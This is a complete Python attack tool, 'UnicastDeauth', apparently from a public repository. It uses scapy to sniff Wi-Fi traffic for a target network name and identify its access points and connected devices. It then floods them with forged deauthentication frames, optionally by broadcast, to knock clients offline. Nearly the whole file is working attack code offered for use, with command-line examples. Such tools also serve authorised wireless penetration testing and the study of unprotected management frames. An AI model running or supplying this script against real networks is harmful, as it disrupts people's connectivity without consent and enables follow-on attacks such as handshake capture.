#!/usr/bin/env python3

# UnicastDeauth is a simple Python 3 script that automates unicast Wi-Fi
# deauthentication attacks
#
# author - mamatb (t.me/m_amatb)
# location - https://github.com/mamatb/UnicastDeauth
# style guide - https://google.github.io/styleguide/pyguide.html

# TODO
#
# add module docstring
# add tests using pytest
# check for protected management frames


import argparse
from collections import abc
import multiprocessing
import re
import sys

from scapy import sendrecv
from scapy.layers import dot11

BROADCAST = 'ff:ff:ff:ff:ff:ff'
DEAUTH_COUNT = 64


class MsgException(Exception):
    """Simple custom exception.

    Attributes:
        class._count: total depth of the exception traceback.
        _message: description of the exception.
        _count: depth level in the exception traceback.
    """
    _count = 0

    def __init__(self, message: str, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self._message = message
        MsgException._count += 1
        self._count = MsgException._count

    def __str__(self) -> str:
        output = []
        if self._count == MsgException._count:
            output.append('[!] Exception: ')
        output.append(f'{self._message}')
        if self.__cause__ is not None:
            output.append('. Caused by:\n')
            output.append('    ' * (MsgException._count - self._count + 1))
            output.append(f'[!] Exception: {self.__cause__}')
        return ''.join(output)

    def panic(self) -> None:
        print(self, file=sys.stderr)


class AccessPoints:
    """Collection of Wi-Fi access points.

    Attributes:
        class._bssid_regex: regex to validate BSSIDs.
        _essid: ESSID used by the access points.
        _bssids: set of BSSIDs used by the access points.
    """
    _bssid_regex = re.compile('^([0-9a-f]{2}:){5}[0-9a-f]{2}$')

    def __init__(self, essid: str, bssids: str | None = None) -> None:
        self._essid = essid
        self._bssids = set()
        if bssids is not None:
            for bssid in map(str.lower, bssids.split(',')):
                if AccessPoints._bssid_regex.match(bssid):
                    self._bssids.add(bssid)

    def __iter__(self) -> abc.Iterator[str]:
        for bssid in self._bssids:
            yield bssid

    @property
    def essid(self) -> str:
        return self._essid

    def add(self, bssid: str) -> None:
        self._bssids.add(bssid)
        print_info(
            f'AP detected for network {self._essid}'
            f'\n    access point = {bssid}'
        )


class Stations:
    """Collection of Wi-Fi stations.

    Attributes:
        _essid: ESSID used by the stations.
        _bssids: dict of {bssid_sta: bssid_ap} used by the stations.
    """

    def __init__(self, essid: str) -> None:
        self._essid = essid
        self._bssids = {}

    def __setitem__(self, bssid_sta: str, bssid_ap: str) -> None:
        self._bssids[bssid_sta] = bssid_ap
        print_info(
            f'STA detected for network {self._essid}'
            f'\n    station      = {bssid_sta}'
            f'\n    access point = {bssid_ap}'
        )

    def get(self, bssid_sta: str) -> str | None:
        return self._bssids.get(bssid_sta)


class DeauthConfig:
    """Configuration of deauthentication attacks.

    Attributes:
        _wifi_interface: attacker Wi-Fi interface.
        _broadcast_enabled: whether broadcast deauthentication is enabled.
        _deauth_rounds: number of deauthentication rounds.
    """

    def __init__(self, wifi_interface: str, broadcast_enabled: bool,
                 deauth_rounds: int) -> None:
        self._wifi_interface = wifi_interface
        self._broadcast_enabled = broadcast_enabled
        self._deauth_rounds = deauth_rounds

    @property
    def wifi_interface(self) -> str:
        return self._wifi_interface

    @property
    def broadcast_enabled(self) -> bool:
        return self._broadcast_enabled

    @property
    def deauth_rounds(self) -> int:
        return self._deauth_rounds


def print_info(message: str) -> None:
    """Prints additional information.

    Args:
        message: additional information to print.

    Returns:
        None.
    """
    print(f'[!] Info: {message}', file=sys.stderr)


def unicast_deauth(deauth_config: DeauthConfig, bssid_sta: str, bssid_ap: str,
                   bssid_net: str) -> None:
    """Performs unicast deauthentication.

    Args:
        deauth_config: configuration of the deauthentication attack.
        bssid_sta: BSSID used by the station.
        bssid_ap: BSSID used by the access point.
        bssid_net: BSSID used by the network.

    Returns:
        None.
    """
    try:
        def unicast_deauth_parallel() -> None:
            sys.stderr = sys.stdout = None
            for _ in range(deauth_config.deauth_rounds):
                sendrecv.sendp(
                    dot11.RadioTap() /
                    dot11.Dot11(
                        addr1=bssid_sta,
                        addr2=bssid_ap,
                        addr3=bssid_net,
                    ) /
                    dot11.Dot11Deauth(reason=7),
                    iface=deauth_config.wifi_interface,
                    count=DEAUTH_COUNT,
                    verbose=False,
                )
                sendrecv.sendp(
                    dot11.RadioTap() /
                    dot11.Dot11(
                        addr1=bssid_ap,
                        addr2=bssid_sta,
                        addr3=bssid_net,
                    ) /
                    dot11.Dot11Deauth(reason=7),
                    iface=deauth_config.wifi_interface,
                    count=DEAUTH_COUNT,
                    verbose=False,
                )

        multiprocessing.Process(target=unicast_deauth_parallel).start()
        print_info(
            f'sending {deauth_config.deauth_rounds} x {DEAUTH_COUNT}'
            f' deauthentication frames from AP {bssid_ap} to STA {bssid_sta}'
        )
        print_info(
            f'sending {deauth_config.deauth_rounds} x {DEAUTH_COUNT}'
            f' deauthentication frames from STA {bssid_sta} to AP {bssid_ap}'
        )
    except Exception as e:
        raise MsgException('unicast deauthentication frames could not be sent') from e


def broadcast_deauth(deauth_config: DeauthConfig, bssid_ap: str, bssid_net: str) -> None:
    """Performs broadcast deauthentication.

    Args:
        deauth_config: configuration of the deauthentication attack.
        bssid_ap: BSSID used by the access point.
        bssid_net: BSSID used by the network.

    Returns:
        None.
    """
    try:
        def broadcast_deauth_parallel() -> None:
            sys.stderr = sys.stdout = None
            for _ in range(deauth_config.deauth_rounds):
                sendrecv.sendp(
                    dot11.RadioTap() /
                    dot11.Dot11(
                        addr1=BROADCAST,
                        addr2=bssid_ap,
                        addr3=bssid_net,
                    ) /
                    dot11.Dot11Deauth(reason=7),
                    iface=deauth_config.wifi_interface,
                    count=DEAUTH_COUNT,
                    verbose=False,
                )

        multiprocessing.Process(target=broadcast_deauth_parallel).start()
        print_info(
            f'sending {deauth_config.deauth_rounds} x {DEAUTH_COUNT} broadcast'
            f' deauthentication frames from AP {bssid_ap}'
        )
    except Exception as e:
        raise MsgException('broadcast deauthentication frames could not be sent') from e


def get_essid(self: dot11.RadioTap) -> str | None:
    """Parses the ESSID of a Wi-Fi frame.

    Args:
        self: Wi-Fi frame.

    Returns:
        ESSID of the Wi-Fi frame or None.
    """
    try:
        dot11_element = self.getlayer(dot11.Dot11Elt)
        while dot11_element is not None and dot11_element.ID != 0:
            dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
        return dot11_element.info.decode() if dot11_element is not None else None
    except Exception as e:
        raise MsgException('ESSID could not be parsed') from e


def get_src_dst_net(self: dot11.RadioTap) -> tuple[str, str, str] | tuple[None, None, None]:
    """Parses the Frame Control field of a Wi-Fi frame.

    Args:
        self: Wi-Fi frame.

    Returns:
        source, destination and network BSSIDs of the Wi-Fi frame or None.
    """
    try:
        bssid_src = bssid_dst = bssid_net = None
        to_ds = self.FCfield & 1
        from_ds = self.FCfield & 2
        if to_ds == 0:
            bssid_dst = self.addr1
            if from_ds == 0:
                bssid_src = self.addr2
                bssid_net = self.addr3
            else:
                bssid_src = self.addr3
                bssid_net = self.addr2
        elif from_ds == 0:
            bssid_src = self.addr2
            bssid_dst = self.addr3
            bssid_net = self.addr1
        return bssid_src, bssid_dst, bssid_net
    except Exception as e:
        raise MsgException('Frame Control field could not be parsed') from e


def is_unicast(self: dot11.RadioTap) -> bool:
    """Checks if a Wi-Fi frame is unicast.

    Args:
        self: Wi-Fi frame.

    Returns:
        whether the Wi-Fi frame is unicast.
    """
    try:
        _, bssid_dst, _ = self.get_src_dst_net()
        return int(bssid_dst.split(':')[0], 16) & 1 == 0
    except Exception as e:
        raise MsgException('Wi-Fi frame could not be classified') from e


def handle_beacon_proberesp(self: dot11.RadioTap, deauth_config: DeauthConfig,
                            aps_targetlist: AccessPoints,
                            aps_whitelist: AccessPoints) -> None:
    """Processes a Wi-Fi frame of type beacon or probe-resp.

    Args:
        self: Wi-Fi frame.
        deauth_config: configuration of the deauthentication attack.
        aps_targetlist: target Wi-Fi access points.
        aps_whitelist: whitelisted Wi-Fi access points.

    Returns:
        None.
    """
    try:
        bssid_src, _, bssid_net = self.get_src_dst_net()
        if (
            bssid_net is not None
            and bssid_src not in aps_targetlist
            and bssid_src not in aps_whitelist
            and self.get_essid() == aps_targetlist.essid
        ):
            aps_targetlist.add(bssid_src)
            if deauth_config.broadcast_enabled:
                broadcast_deauth(deauth_config, bssid_src, bssid_net)
    except Exception as e:
        raise MsgException('beacon/probe-resp frame could not be processed') from e


def handle_probereq(self: dot11.RadioTap, deauth_config: DeauthConfig,
                    aps_targetlist: AccessPoints, aps_whitelist: AccessPoints) -> None:
    """Processes a Wi-Fi frame of type probe-req.

    Args:
        self: Wi-Fi frame.
        deauth_config: configuration of the deauthentication attack.
        aps_targetlist: target Wi-Fi access points.
        aps_whitelist: whitelisted Wi-Fi access points.

    Returns:
        None.
    """
    try:
        _, bssid_dst, bssid_net = self.get_src_dst_net()
        if (
            bssid_net is not None
            and self.is_unicast()
            and bssid_dst not in aps_targetlist
            and bssid_dst not in aps_whitelist
            and self.get_essid() == aps_targetlist.essid
        ):
            aps_targetlist.add(bssid_dst)
            if deauth_config.broadcast_enabled:
                broadcast_deauth(deauth_config, bssid_dst, bssid_net)
    except Exception as e:
        raise MsgException('probe-req frame could not be processed') from e


def handle_ctl_data(self: dot11.RadioTap, deauth_config: DeauthConfig,
                    aps_targetlist: AccessPoints, stations: Stations) -> None:
    """Processes a Wi-Fi frame of type ctl or data.

    Args:
        self: Wi-Fi frame.
        deauth_config: configuration of the deauthentication attack.
        aps_targetlist: target Wi-Fi access points.
        stations: target Wi-Fi stations.

    Returns:
        None.
    """
    try:
        bssid_src, bssid_dst, bssid_net = self.get_src_dst_net()
        if bssid_net is not None:
            if (
                self.is_unicast()
                and bssid_src in aps_targetlist
                and stations.get(bssid_dst) != bssid_src
            ):
                stations[bssid_dst] = bssid_src
                unicast_deauth(deauth_config, bssid_dst, bssid_src, bssid_net)
            elif (
                bssid_dst in aps_targetlist
                and stations.get(bssid_src) != bssid_dst
            ):
                stations[bssid_src] = bssid_dst
                unicast_deauth(deauth_config, bssid_src, bssid_dst, bssid_net)
    except Exception as e:
        raise MsgException('ctl/data frame could not be processed') from e


def handle_frame(self: dot11.RadioTap, deauth_config: DeauthConfig,
                 aps_targetlist: AccessPoints, aps_whitelist: AccessPoints,
                 stations: Stations) -> None:
    """Processes a sniffed Wi-Fi frame.

    Args:
        self: Wi-Fi frame.
        deauth_config: configuration of the deauthentication attack.
        aps_targetlist: target Wi-Fi access points.
        aps_whitelist: whitelisted Wi-Fi access points.
        stations: target Wi-Fi stations.

    Returns:
        None.
    """
    try:
        if self.haslayer(dot11.Dot11Beacon) or self.haslayer(dot11.Dot11ProbeResp):
            self.handle_beacon_proberesp(
                deauth_config,
                aps_targetlist,
                aps_whitelist,
            )
        elif self.haslayer(dot11.Dot11ProbeReq):
            self.handle_probereq(
                deauth_config,
                aps_targetlist,
                aps_whitelist,
            )
        else:
            self.handle_ctl_data(
                deauth_config,
                aps_targetlist,
                stations,
            )
    except Exception as e:
        raise MsgException('sniffed Wi-Fi frame could not be processed') from e


def main() -> None:  # pylint: disable=C0116
    try:
        examples = [
            'examples:',
            'UnicastDeauth.py -i wlan0 -e NETGEAR -b',
            'UnicastDeauth.py -i wlan0 -e NETGEAR -n 8',
            'UnicastDeauth.py -i wlan0 -e NETGEAR -tl 00:11:22:33:44:00,00:11:22:33:44:55',
            'UnicastDeauth.py -i wlan0 -e NETGEAR -wl 00:11:22:33:44:00,00:11:22:33:44:55',
        ]
        parser = argparse.ArgumentParser(
            description=(
                'UnicastDeauth is a simple Python 3 script that automates'
                ' unicast Wi-Fi deauthentication attacks'
            ),
            formatter_class=argparse.RawTextHelpFormatter,
            epilog='\n  '.join(examples),
        )
        parser.add_argument(
            '-i',
            dest='wifi_interface',
            required=True,
            help='attacker Wi-Fi interface',
        )
        parser.add_argument(
            '-e',
            dest='essid',
            required=True,
            help='target ESSID',
        )
        parser.add_argument(
            '-b',
            dest='broadcast_enabled',
            action='store_true',
            help='enable broadcast deauthentication',
        )
        parser.add_argument(
            '-n',
            dest='deauth_rounds',
            type=int,
            default=1,
            help='number of deauthentication rounds',
        )
        parser.add_argument(
            '-tl',
            dest='aps_targetlist',
            help='comma-separated known target APs',
        )
        parser.add_argument(
            '-wl',
            dest='aps_whitelist',
            help='comma-separated APs whitelist',
        )
        args = parser.parse_args()

        filters = [
            'wlan type mgt subtype beacon',
            'wlan type mgt subtype probe-req',
            'wlan type mgt subtype probe-resp',
            'wlan type ctl',
            'wlan type data',
        ]
        methods_dot11_RadioTap = [
            get_essid,
            get_src_dst_net,
            is_unicast,
            handle_beacon_proberesp,
            handle_probereq,
            handle_ctl_data,
            handle_frame,
        ]
        for method in methods_dot11_RadioTap:
            setattr(dot11.RadioTap, method.__name__, method)
        deauth_config = DeauthConfig(
            args.wifi_interface,
            args.broadcast_enabled,
            args.deauth_rounds,
        )
        aps_targetlist = AccessPoints(args.essid, args.aps_targetlist)
        aps_whitelist = AccessPoints(args.essid, args.aps_whitelist)
        stations = Stations(args.essid)
        if deauth_config.broadcast_enabled:
            for bssid in aps_targetlist:
                broadcast_deauth(deauth_config, bssid, bssid)
        sendrecv.sniff(
            iface=args.wifi_interface,
            filter=' or '.join(filters),
            prn=lambda frame: frame.handle_frame(
                deauth_config,
                aps_targetlist,
                aps_whitelist,
                stations,
            ),
        )
    except MsgException as msg_exception:
        msg_exception.panic()
    except Exception as e:
        MsgException(e).panic()
    finally:
        try:
            for child in multiprocessing.active_children():
                child.terminate()
        except Exception as e:
            MsgException(e).panic()
            sys.exit(-1)


if __name__ == '__main__':
    main()
